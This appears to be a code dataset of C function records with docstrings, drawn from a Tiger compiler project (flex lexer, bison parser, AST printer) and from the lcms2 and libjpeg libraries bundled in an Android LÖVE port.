{"docstring": "/** Setup the input buffer state to scan directly from a user-specified character buffer.\n * @param base the character buffer\n * @param size the size in bytes of the character buffer\n * \n * @return the newly allocated buffer state object. \n */\n", "func_signal": "YY_BUFFER_STATE yy_scan_buffer  (char * base, yy_size_t  size )", "code": "{\n\tYY_BUFFER_STATE b;\n    \n\tif ( size < 2 ||\n\t     base[size-2] != YY_END_OF_BUFFER_CHAR ||\n\t     base[size-1] != YY_END_OF_BUFFER_CHAR )\n\t\t/* They forgot to leave room for the EOB's. */\n\t\treturn 0;\n\n\tb = (YY_BUFFER_STATE) yyalloc(sizeof( struct yy_buffer_state )  );\n\tif ( ! b )\n\t\tYY_FATAL_ERROR( \"out of dynamic memory in yy_scan_buffer()\" );\n\n\tb->yy_buf_size = size - 2;\t/* \"- 2\" to take care of EOB's */\n\tb->yy_buf_pos = b->yy_ch_buf = base;\n\tb->yy_is_our_buffer = 0;\n\tb->yy_input_file = 0;\n\tb->yy_n_chars = b->yy_buf_size;\n\tb->yy_is_interactive = 0;\n\tb->yy_at_bol = 1;\n\tb->yy_fill_buffer = 0;\n\tb->yy_buffer_status = YY_BUFFER_NEW;\n\n\tyy_switch_to_buffer(b  );\n\n\treturn b;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* print the assembly language instructions to filename.s */\n", "func_signal": "static void doProc(FILE *out, F_frame frame, T_stm body)", "code": "{\n\tAS_proc proc;\n\tstruct RA_result allocation;\n\tT_stmList stmList;\n\tAS_instrList iList;\n\t\n\tstmList = C_linearize(body);\n\tstmList = C_traceSchedule(C_basicBlocks(stmList));\n\t/* printStmList(stdout, stmList);*/\n\tiList  = F_codegen(frame, stmList); /* 9 */\n\t\n\tfprintf(out, \"BEGIN %s\\n\", Temp_labelstring(F_name(frame)));\n\tAS_printInstrList (out, iList,\n\t\t\t\t\t   Temp_layerMap(F_tempMap,Temp_name()));\n\tfprintf(out, \"END %s\\n\\n\", Temp_labelstring(F_name(frame)));\n}", "path": "test\\main.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* Initializes or reinitializes a buffer.\n * This function is sometimes called more than once on the same buffer,\n * such as during a yyrestart() or at EOF.\n */\n", "func_signal": "static void yy_init_buffer  (YY_BUFFER_STATE  b, FILE * file )", "code": "{\n\tint oerrno = errno;\n    \n\tyy_flush_buffer(b );\n\n\tb->yy_input_file = file;\n\tb->yy_fill_buffer = 1;\n\n    /* If b is the current buffer, then yy_init_buffer was _probably_\n     * called from yyrestart() or through yy_get_next_buffer.\n     * In that case, we don't want to reset the lineno or column.\n     */\n    if (b != YY_CURRENT_BUFFER){\n        b->yy_bs_lineno = 1;\n        b->yy_bs_column = 0;\n    }\n\n        b->yy_is_interactive = file ? (isatty( fileno(file) ) > 0) : 0;\n    \n\terrno = oerrno;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* Print A_var types. Indent d spaces. */\n", "func_signal": "static void pr_var(FILE *out, A_var v, int d)", "code": "{\n indent(out, d);\n switch (v->kind) {\n case A_simpleVar:\n   fprintf(out, \"simpleVar(%s)\", S_name(v->u.simple)); \n   break;\n case A_fieldVar:\n   fprintf(out, \"%s\\n\", \"fieldVar(\");\n   pr_var(out, v->u.field.var, d+1); fprintf(out, \"%s\\n\", \",\"); \n   indent(out, d+1); fprintf(out, \"%s)\", S_name(v->u.field.sym));\n   break;\n case A_subscriptVar:\n   fprintf(out, \"%s\\n\", \"subscriptVar(\");\n   pr_var(out, v->u.subscript.var, d+1); fprintf(out, \"%s\\n\", \",\"); \n   pr_exp(out, v->u.subscript.exp, d+1); fprintf(out, \"%s\", \")\");\n   break;\n default:\n   assert(0); \n } \n}", "path": "src\\prabsyn.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/** Immediately switch to a different input stream.\n * @param input_file A readable stream.\n * \n * @note This function does not reset the start condition to @c INITIAL .\n */\n", "func_signal": "void yyrestart  (FILE * input_file )", "code": "{\n    \n\tif ( ! YY_CURRENT_BUFFER ){\n        yyensure_buffer_stack ();\n\t\tYY_CURRENT_BUFFER_LVALUE =\n            yy_create_buffer(yyin,YY_BUF_SIZE );\n\t}\n\n\tyy_init_buffer(YY_CURRENT_BUFFER,input_file );\n\tyy_load_buffer_state( );\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/** Pushes the new state onto the stack. The new state becomes\n *  the current state. This function will allocate the stack\n *  if necessary.\n *  @param new_buffer The new state.\n *  \n */\n", "func_signal": "void yypush_buffer_state (YY_BUFFER_STATE new_buffer )", "code": "{\n    \tif (new_buffer == NULL)\n\t\treturn;\n\n\tyyensure_buffer_stack();\n\n\t/* This block is copied from yy_switch_to_buffer. */\n\tif ( YY_CURRENT_BUFFER )\n\t\t{\n\t\t/* Flush out information for old buffer. */\n\t\t*(yy_c_buf_p) = (yy_hold_char);\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_buf_pos = (yy_c_buf_p);\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = (yy_n_chars);\n\t\t}\n\n\t/* Only push if top exists. Otherwise, replace top. */\n\tif (YY_CURRENT_BUFFER)\n\t\t(yy_buffer_stack_top)++;\n\tYY_CURRENT_BUFFER_LVALUE = new_buffer;\n\n\t/* copied from yy_switch_to_buffer. */\n\tyy_load_buffer_state( );\n\t(yy_did_buffer_switch_on_eof) = 1;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/** Removes and deletes the top of the stack, if present.\n *  The next element becomes the new top.\n *  \n */\n", "func_signal": "void yypop_buffer_state (void)", "code": "{\n    \tif (!YY_CURRENT_BUFFER)\n\t\treturn;\n\n\tyy_delete_buffer(YY_CURRENT_BUFFER );\n\tYY_CURRENT_BUFFER_LVALUE = NULL;\n\tif ((yy_buffer_stack_top) > 0)\n\t\t--(yy_buffer_stack_top);\n\n\tif (YY_CURRENT_BUFFER) {\n\t\tyy_load_buffer_state( );\n\t\t(yy_did_buffer_switch_on_eof) = 1;\n\t}\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/** Setup the input buffer state to scan the given bytes. The next call to yylex() will\n * scan from a @e copy of @a bytes.\n * @param yybytes the byte buffer to scan\n * @param _yybytes_len the number of bytes in the buffer pointed to by @a bytes.\n * \n * @return the newly allocated buffer state object.\n */\n", "func_signal": "YY_BUFFER_STATE yy_scan_bytes  (yyconst char * yybytes, int  _yybytes_len )", "code": "{\n\tYY_BUFFER_STATE b;\n\tchar *buf;\n\tyy_size_t n;\n\tint i;\n    \n\t/* Get memory for full buffer, including space for trailing EOB's. */\n\tn = _yybytes_len + 2;\n\tbuf = (char *) yyalloc(n  );\n\tif ( ! buf )\n\t\tYY_FATAL_ERROR( \"out of dynamic memory in yy_scan_bytes()\" );\n\n\tfor ( i = 0; i < _yybytes_len; ++i )\n\t\tbuf[i] = yybytes[i];\n\n\tbuf[_yybytes_len] = buf[_yybytes_len+1] = YY_END_OF_BUFFER_CHAR;\n\n\tb = yy_scan_buffer(buf,n );\n\tif ( ! b )\n\t\tYY_FATAL_ERROR( \"bad buffer in yy_scan_bytes()\" );\n\n\t/* It's okay to grow etc. this buffer, and we should throw it\n\t * away when we're done.\n\t */\n\tb->yy_is_our_buffer = 1;\n\n\treturn b;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* Print A_var types. Indent d spaces. */\n", "func_signal": "void pr_exp(FILE *out, A_exp v, int d)", "code": "{\n indent(out, d);\n switch (v->kind) {\n case A_varExp:\n   fprintf(out, \"varExp(\\n\"); pr_var(out, v->u.var, d+1); \n   fprintf(out, \"%s\", \")\");\n   break;\n case A_nilExp:\n   fprintf(out, \"nilExp()\");\n   break;\n case A_intExp:\n   fprintf(out, \"intExp(%d)\", v->u.intt);\n   break;\n case A_stringExp:\n   fprintf(out, \"stringExp(%s)\", v->u.stringg);\n   break;\n case A_callExp:\n   fprintf(out, \"callExp(%s,\\n\", S_name(v->u.call.func));\n   pr_expList(out, v->u.call.args, d+1); fprintf(out, \")\");\n   break;\n case A_opExp:\n   fprintf(out, \"opExp(\\n\");\n   indent(out, d+1); pr_oper(out, v->u.op.oper); fprintf(out, \",\\n\"); \n   pr_exp(out, v->u.op.left, d+1); fprintf(out, \",\\n\"); \n   pr_exp(out, v->u.op.right, d+1); fprintf(out, \")\");\n   break;\n case A_recordExp:\n   fprintf(out, \"recordExp(%s,\\n\", S_name(v->u.record.typ)); \n   pr_efieldList(out, v->u.record.fields, d+1); fprintf(out, \")\");\n   break;\n case A_seqExp:\n   fprintf(out, \"seqExp(\\n\");\n   pr_expList(out, v->u.seq, d+1); fprintf(out, \")\");\n   break;\n case A_assignExp:\n   fprintf(out, \"assignExp(\\n\");\n   pr_var(out, v->u.assign.var, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.assign.exp, d+1); fprintf(out, \")\");\n   break;\n case A_ifExp:\n   fprintf(out, \"iffExp(\\n\");\n   pr_exp(out, v->u.iff.test, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.iff.then, d+1);\n   if (v->u.iff.elsee) { /* else is optional */\n      fprintf(out, \",\\n\");\n      pr_exp(out, v->u.iff.elsee, d+1);\n   }\n   fprintf(out, \")\");\n   break;\n case A_whileExp:\n   fprintf(out, \"whileExp(\\n\");\n   pr_exp(out, v->u.whilee.test, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.whilee.body, d+1); fprintf(out, \")\\n\");\n   break;\n case A_forExp:\n   fprintf(out, \"forExp(%s,\\n\", S_name(v->u.forr.var)); \n   pr_exp(out, v->u.forr.lo, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.forr.hi, d+1); fprintf(out, \"%s\\n\", \",\");\n   pr_exp(out, v->u.forr.body, d+1); fprintf(out, \",\\n\");\n   indent(out, d+1); fprintf(out, \"%s\", v->u.forr.escape ? \"TRUE)\" : \"FALSE)\");\n   break;\n case A_breakExp:\n   fprintf(out, \"breakExp()\");\n   break;\n case A_letExp:\n   fprintf(out, \"letExp(\\n\");\n   pr_decList(out, v->u.let.decs, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.let.body, d+1); fprintf(out, \")\");\n   break;\n case A_arrayExp:\n   fprintf(out, \"arrayExp(%s,\\n\", S_name(v->u.array.typ));\n   pr_exp(out, v->u.array.size, d+1); fprintf(out, \",\\n\");\n   pr_exp(out, v->u.array.init, d+1); fprintf(out, \")\");\n   break;\n default:\n   assert(0); \n } \n}", "path": "src\\prabsyn.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/** Switch to a different input buffer.\n * @param new_buffer The new input buffer.\n * \n */\n", "func_signal": "void yy_switch_to_buffer  (YY_BUFFER_STATE  new_buffer )", "code": "{\n    \n\t/* TODO. We should be able to replace this entire function body\n\t * with\n\t *\t\tyypop_buffer_state();\n\t *\t\tyypush_buffer_state(new_buffer);\n     */\n\tyyensure_buffer_stack ();\n\tif ( YY_CURRENT_BUFFER == new_buffer )\n\t\treturn;\n\n\tif ( YY_CURRENT_BUFFER )\n\t\t{\n\t\t/* Flush out information for old buffer. */\n\t\t*(yy_c_buf_p) = (yy_hold_char);\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_buf_pos = (yy_c_buf_p);\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = (yy_n_chars);\n\t\t}\n\n\tYY_CURRENT_BUFFER_LVALUE = new_buffer;\n\tyy_load_buffer_state( );\n\n\t/* We don't actually know whether we did this switch during\n\t * EOF (yywrap()) processing, but the only time this flag\n\t * is looked at is after yywrap() is called, so it's safe\n\t * to go ahead and always set it.\n\t */\n\t(yy_did_buffer_switch_on_eof) = 1;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* yy_get_previous_state - get the state just before the EOB char was reached */\n", "func_signal": "static yy_state_type yy_get_previous_state (void)", "code": "{\n\tregister yy_state_type yy_current_state;\n\tregister char *yy_cp;\n    \n\tyy_current_state = (yy_start);\n\n\tfor ( yy_cp = (yytext_ptr) + YY_MORE_ADJ; yy_cp < (yy_c_buf_p); ++yy_cp )\n\t\t{\n\t\tregister YY_CHAR yy_c = (*yy_cp ? yy_ec[YY_SC_TO_UI(*yy_cp)] : 1);\n\t\tif ( yy_accept[yy_current_state] )\n\t\t\t{\n\t\t\t(yy_last_accepting_state) = yy_current_state;\n\t\t\t(yy_last_accepting_cpos) = yy_cp;\n\t\t\t}\n\t\twhile ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )\n\t\t\t{\n\t\t\tyy_current_state = (int) yy_def[yy_current_state];\n\t\t\tif ( yy_current_state >= 124 )\n\t\t\t\tyy_c = yy_meta[(unsigned int) yy_c];\n\t\t\t}\n\t\tyy_current_state = yy_nxt[yy_base[yy_current_state] + (unsigned int) yy_c];\n\t\t}\n\n\treturn yy_current_state;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* yylex_destroy is for both reentrant and non-reentrant scanners. */\n", "func_signal": "int yylex_destroy  (void)", "code": "{\n    \n    /* Pop the buffer stack, destroying each element. */\n\twhile(YY_CURRENT_BUFFER){\n\t\tyy_delete_buffer(YY_CURRENT_BUFFER  );\n\t\tYY_CURRENT_BUFFER_LVALUE = NULL;\n\t\tyypop_buffer_state();\n\t}\n\n\t/* Destroy the stack itself. */\n\tyyfree((yy_buffer_stack) );\n\t(yy_buffer_stack) = NULL;\n\n    /* Reset the globals. This is important in a non-reentrant scanner so the next time\n     * yylex() is called, initialization will occur. */\n    yy_init_globals( );\n\n    return 0;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* Copy into YYRESULT an error message about the unexpected token\n   YYCHAR while in state YYSTATE.  Return the number of bytes copied,\n   including the terminating null byte.  If YYRESULT is null, do not\n   copy anything; just return the number of bytes that would be\n   copied.  As a special case, return 0 if an ordinary \"syntax error\"\n   message will do.  Return YYSIZE_MAXIMUM if overflow occurs during\n   size calculation.  */\n", "func_signal": "static YYSIZE_T\nyysyntax_error (char *yyresult, int yystate, int yychar)", "code": "{\n  int yyn = yypact[yystate];\n\n  if (! (YYPACT_NINF < yyn && yyn <= YYLAST))\n    return 0;\n  else\n    {\n      int yytype = YYTRANSLATE (yychar);\n      YYSIZE_T yysize0 = yytnamerr (0, yytname[yytype]);\n      YYSIZE_T yysize = yysize0;\n      YYSIZE_T yysize1;\n      int yysize_overflow = 0;\n      enum { YYERROR_VERBOSE_ARGS_MAXIMUM = 5 };\n      char const *yyarg[YYERROR_VERBOSE_ARGS_MAXIMUM];\n      int yyx;\n\n# if 0\n      /* This is so xgettext sees the translatable formats that are\n\t constructed on the fly.  */\n      YY_(\"syntax error, unexpected %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s or %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s or %s or %s\");\n# endif\n      char *yyfmt;\n      char const *yyf;\n      static char const yyunexpected[] = \"syntax error, unexpected %s\";\n      static char const yyexpecting[] = \", expecting %s\";\n      static char const yyor[] = \" or %s\";\n      char yyformat[sizeof yyunexpected\n\t\t    + sizeof yyexpecting - 1\n\t\t    + ((YYERROR_VERBOSE_ARGS_MAXIMUM - 2)\n\t\t       * (sizeof yyor - 1))];\n      char const *yyprefix = yyexpecting;\n\n      /* Start YYX at -YYN if negative to avoid negative indexes in\n\t YYCHECK.  */\n      int yyxbegin = yyn < 0 ? -yyn : 0;\n\n      /* Stay within bounds of both yycheck and yytname.  */\n      int yychecklim = YYLAST - yyn + 1;\n      int yyxend = yychecklim < YYNTOKENS ? yychecklim : YYNTOKENS;\n      int yycount = 1;\n\n      yyarg[0] = yytname[yytype];\n      yyfmt = yystpcpy (yyformat, yyunexpected);\n\n      for (yyx = yyxbegin; yyx < yyxend; ++yyx)\n\tif (yycheck[yyx + yyn] == yyx && yyx != YYTERROR)\n\t  {\n\t    if (yycount == YYERROR_VERBOSE_ARGS_MAXIMUM)\n\t      {\n\t\tyycount = 1;\n\t\tyysize = yysize0;\n\t\tyyformat[sizeof yyunexpected - 1] = '\\0';\n\t\tbreak;\n\t      }\n\t    yyarg[yycount++] = yytname[yyx];\n\t    yysize1 = yysize + yytnamerr (0, yytname[yyx]);\n\t    yysize_overflow |= (yysize1 < yysize);\n\t    yysize = yysize1;\n\t    yyfmt = yystpcpy (yyfmt, yyprefix);\n\t    yyprefix = yyor;\n\t  }\n\n      yyf = YY_(yyformat);\n      yysize1 = yysize + yystrlen (yyf);\n      yysize_overflow |= (yysize1 < yysize);\n      yysize = yysize1;\n\n      if (yysize_overflow)\n\treturn YYSIZE_MAXIMUM;\n\n      if (yyresult)\n\t{\n\t  /* Avoid sprintf, as that infringes on the user's name space.\n\t     Don't have undefined behavior even if the translation\n\t     produced a string with the wrong number of \"%s\"s.  */\n\t  char *yyp = yyresult;\n\t  int yyi = 0;\n\t  while ((*yyp = *yyf) != '\\0')\n\t    {\n\t      if (*yyp == '%' && yyf[1] == 's' && yyi < yycount)\n\t\t{\n\t\t  yyp += yytnamerr (yyp, yyarg[yyi++]);\n\t\t  yyf += 2;\n\t\t}\n\t      else\n\t\t{\n\t\t  yyp++;\n\t\t  yyf++;\n\t\t}\n\t    }\n\t}\n      return yysize;\n    }\n}", "path": "src\\y.tab.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* print the assembly language instructions to filename.s */\n", "func_signal": "static void doProc(FILE *out, F_frame frame, T_stm body)", "code": "{\n\tT_stmList stmList;\n\tAS_instrList iList;\n\t\n\tstmList = C_linearize(body);\n\tstmList = C_traceSchedule(C_basicBlocks(stmList));\n\t/* printStmList(stdout, stmList);*/\n\tiList  = F_codegen(frame, stmList); /* 9 */\n\t\n\t//fprintf(out, \"BEGIN %s\\n\", Temp_labelstring(F_name(frame)));\n\tAS_printInstrList (out, iList,\n\t\t\t\t\t   Temp_layerMap(F_tempMap,Temp_name()));\n\t//fprintf(out, \"END %s\\n\\n\", Temp_labelstring(F_name(frame)));\n}", "path": "test\\codegentest.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "// Quantize sector of a spherical coordinate. Saturate 360, 180 to last sector\n// The limits are the centers of each sector, so\n", "func_signal": "static\nvoid QuantizeToSector(const cmsSpherical* sp, int* alpha, int* theta)", "code": "{   \n    *alpha = (int) floor(((sp->alpha * (SECTORS)) / 360.0) );            \n    *theta = (int) floor(((sp->theta * (SECTORS)) / 180.0) );    \n\n\tif (*alpha >= SECTORS)\n\t\t*alpha = SECTORS-1;\n\tif (*theta >= SECTORS)\n\t\t*theta = SECTORS-1;\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Line determined by 2 points\n", "func_signal": "static\nvoid LineOf2Points(cmsLine* line, cmsVEC3* a, cmsVEC3* b)", "code": "{\n\n    _cmsVEC3init(&line ->a, a ->n[VX], a ->n[VY], a ->n[VZ]);\n    _cmsVEC3init(&line ->u, b ->n[VX] - a ->n[VX], \n                            b ->n[VY] - a ->n[VY], \n                            b ->n[VZ] - a ->n[VZ]);     \n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n * Write scan header.\n * This consists of DHT or DAC markers, optional DRI, and SOS.\n * Compressed data will be written following the SOS.\n */\n", "func_signal": "METHODDEF(void)\nwrite_scan_header (j_compress_ptr cinfo)", "code": "{\n  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;\n  int i;\n  jpeg_component_info *compptr;\n\n  if (cinfo->arith_code) {\n    /* Emit arith conditioning info.  We may have some duplication\n     * if the file has multiple scans, but it's so small it's hardly\n     * worth worrying about.\n     */\n    emit_dac(cinfo);\n  } else {\n    /* Emit Huffman tables.\n     * Note that emit_dht() suppresses any duplicate tables.\n     */\n    for (i = 0; i < cinfo->comps_in_scan; i++) {\n      compptr = cinfo->cur_comp_info[i];\n      /* DC needs no table for refinement scan */\n      if (cinfo->Ss == 0 && cinfo->Ah == 0)\n\temit_dht(cinfo, compptr->dc_tbl_no, FALSE);\n      /* AC needs no table when not present */\n      if (cinfo->Se)\n\temit_dht(cinfo, compptr->ac_tbl_no, TRUE);\n    }\n  }\n\n  /* Emit DRI if required --- note that DRI value could change for each scan.\n   * We avoid wasting space with unnecessary DRIs, however.\n   */\n  if (cinfo->restart_interval != marker->last_restart_interval) {\n    emit_dri(cinfo);\n    marker->last_restart_interval = cinfo->restart_interval;\n  }\n\n  emit_sos(cinfo);\n}", "path": "jni\\jpeg-8c\\jcmarker.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Check if a given point falls inside gamut\n", "func_signal": "cmsBool CMSEXPORT cmsGDBCheckPoint(cmsHANDLE hGBD, const cmsCIELab* Lab)", "code": "{\n    cmsGDB* gbd = (cmsGDB*) hGBD;   \n    cmsGDBPoint* ptr;\n    cmsSpherical sp;\n\n    // Get pointer to the sector\n    ptr = GetPoint(gbd, Lab, &sp);\n    if (ptr == NULL) return FALSE;\n\n    // If no samples at this sector, return no data\n    if (ptr ->Type == GP_EMPTY) return FALSE;\n\n    // In gamut only if radius is greater\n\n    return (sp.r <= ptr -> p.r);\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Interpolate a missing sector. Method identifies whatever this is top, bottom or mid\n", "func_signal": "static\ncmsBool InterpolateMissingSector(cmsGDB* gbd, int alpha, int theta)", "code": "{   \n    cmsSpherical sp;\n    cmsVEC3 Lab;\n    cmsVEC3 Centre;\n    cmsLine ray;\n    int nCloseSectors;\n    cmsGDBPoint* Close[NSTEPS + 1]; \n    cmsSpherical closel, templ;\n    cmsLine edge;\n    int k, m;\n    \n    // Is that point already specified?\n    if (gbd ->Gamut[theta][alpha].Type != GP_EMPTY) return TRUE;\n\n    // Fill close points\n    nCloseSectors = FindNearSectors(gbd, alpha, theta, Close);\n\n\n    // Find a central point on the sector \n    sp.alpha = (cmsFloat64Number) ((alpha + 0.5) * 360.0) / (SECTORS);\n    sp.theta = (cmsFloat64Number) ((theta + 0.5) * 180.0) / (SECTORS);\n    sp.r     = 50.0; \n\n    // Convert to Cartesian\n    ToCartesian(&Lab, &sp);\n\n    // Create a ray line from centre to this point\n    _cmsVEC3init(&Centre, 50.0, 0, 0);\n    LineOf2Points(&ray, &Lab, &Centre);\n\n    // For all close sectors\n    closel.r = 0.0;\n    closel.alpha = 0;\n    closel.theta = 0;\n\n    for (k=0; k < nCloseSectors; k++) {\n\n        for(m = k+1; m < nCloseSectors; m++) {\n\n            cmsVEC3 temp, a1, a2;\n        \n            // A line from sector to sector\n            ToCartesian(&a1, &Close[k]->p);\n            ToCartesian(&a2, &Close[m]->p);\n\n            LineOf2Points(&edge, &a1, &a2);\n\n            // Find a line  \n            ClosestLineToLine(&temp, &ray, &edge);\n\n            // Convert to spherical\n            ToSpherical(&templ, &temp);\n            \n\n            if ( templ.r > closel.r && \n                 templ.theta >= (theta*180.0/SECTORS) && \n                 templ.theta <= ((theta+1)*180.0/SECTORS) &&\n                 templ.alpha >= (alpha*360.0/SECTORS) &&\n                 templ.alpha <= ((alpha+1)*360.0/SECTORS)) {\n\n                closel = templ;         \n            }       \n        }\n    }\n\n    gbd ->Gamut[theta][alpha].p = closel;\n    gbd ->Gamut[theta][alpha].Type = GP_MODELED;\n\n    return TRUE;\n\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n    Closest point in sector line1 to sector line2 (both are defined as 0 <=t <= 1)\n    http://softsurfer.com/Archive/algorithm_0106/algorithm_0106.htm\n\n    Copyright 2001, softSurfer (www.softsurfer.com)\n    This code may be freely used and modified for any purpose\n    providing that this copyright notice is included with it.\n    SoftSurfer makes no warranty for this code, and cannot be held\n    liable for any real or imagined damage resulting from its use.\n    Users of this code must verify correctness for their application.\n\n*/\n", "func_signal": "static\ncmsBool ClosestLineToLine(cmsVEC3* r, const cmsLine* line1, const cmsLine* line2)", "code": "{\n    cmsFloat64Number a, b, c, d, e, D;\n    cmsFloat64Number sc, sN, sD; \n    cmsFloat64Number tc, tN, tD;\n    cmsVEC3 w0;\n\n    _cmsVEC3minus(&w0, &line1 ->a, &line2 ->a);\n\n    a  = _cmsVEC3dot(&line1 ->u, &line1 ->u);\n    b  = _cmsVEC3dot(&line1 ->u, &line2 ->u);\n    c  = _cmsVEC3dot(&line2 ->u, &line2 ->u);\n    d  = _cmsVEC3dot(&line1 ->u, &w0);\n    e  = _cmsVEC3dot(&line2 ->u, &w0);\n\n    D  = a*c - b * b;      // Denominator\n    sD = tD = D;           // default sD = D >= 0\n\n    if (D <  MATRIX_DET_TOLERANCE) {   // the lines are almost parallel\n\n        sN = 0.0;        // force using point P0 on segment S1\n        sD = 1.0;        // to prevent possible division by 0.0 later\n        tN = e;\n        tD = c;\n    }\n    else {                // get the closest points on the infinite lines\n\n        sN = (b*e - c*d);\n        tN = (a*e - b*d);\n\n        if (sN < 0.0) {       // sc < 0 => the s=0 edge is visible\n\n            sN = 0.0;\n            tN = e;\n            tD = c;\n        }\n        else if (sN > sD) {   // sc > 1 => the s=1 edge is visible\n            sN = sD;\n            tN = e + b;\n            tD = c;\n        }\n    }\n\n    if (tN < 0.0) {           // tc < 0 => the t=0 edge is visible\n\n        tN = 0.0;\n        // recompute sc for this edge\n        if (-d < 0.0)\n            sN = 0.0;\n        else if (-d > a)\n            sN = sD;\n        else {\n            sN = -d;\n            sD = a;\n        }\n    }\n    else if (tN > tD) {      // tc > 1 => the t=1 edge is visible\n        \n        tN = tD;\n        \n        // recompute sc for this edge\n        if ((-d + b) < 0.0)\n            sN = 0;\n        else if ((-d + b) > a)\n            sN = sD;\n        else {\n            sN = (-d + b);\n            sD = a;\n        }\n    }\n    // finally do the division to get sc and tc\n    sc = (fabs(sN) < MATRIX_DET_TOLERANCE ? 0.0 : sN / sD);\n    tc = (fabs(tN) < MATRIX_DET_TOLERANCE ? 0.0 : tN / tD);\n\n    GetPointOfLine(r, line1, sc);\n    return TRUE;\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Convert to cartesian from spherical\n", "func_signal": "static\nvoid ToCartesian(cmsVEC3* v, const cmsSpherical* sp)", "code": "{\n    cmsFloat64Number sin_alpha;\n    cmsFloat64Number cos_alpha;\n    cmsFloat64Number sin_theta;\n    cmsFloat64Number cos_theta;\n    cmsFloat64Number L, a, b;\n\n    sin_alpha = sin((M_PI * sp ->alpha) / 180.0);\n    cos_alpha = cos((M_PI * sp ->alpha) / 180.0);\n    sin_theta = sin((M_PI * sp ->theta) / 180.0);\n    cos_theta = cos((M_PI * sp ->theta) / 180.0);\n\n    a = sp ->r * sin_theta * sin_alpha;\n    b = sp ->r * sin_theta * cos_alpha; \n    L = sp ->r * cos_theta;\n\n    v ->n[VX] = L;\n    v ->n[VY] = a;\n    v ->n[VZ] = b;\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n * Write datastream header.\n * This consists of an SOI and optional APPn markers.\n * We recommend use of the JFIF marker, but not the Adobe marker,\n * when using YCbCr or grayscale data.  The JFIF marker should NOT\n * be used for any other JPEG colorspace.  The Adobe marker is helpful\n * to distinguish RGB, CMYK, and YCCK colorspaces.\n * Note that an application can write additional header markers after\n * jpeg_start_compress returns.\n */\n", "func_signal": "METHODDEF(void)\nwrite_file_header (j_compress_ptr cinfo)", "code": "{\n  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;\n\n  emit_marker(cinfo, M_SOI);\t/* first the SOI */\n\n  /* SOI is defined to reset restart interval to 0 */\n  marker->last_restart_interval = 0;\n\n  if (cinfo->write_JFIF_header)\t/* next an optional JFIF APP0 */\n    emit_jfif_app0(cinfo);\n  if (cinfo->write_Adobe_marker) /* next an optional Adobe APP14 */\n    emit_adobe_app14(cinfo);\n}", "path": "jni\\jpeg-8c\\jcmarker.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
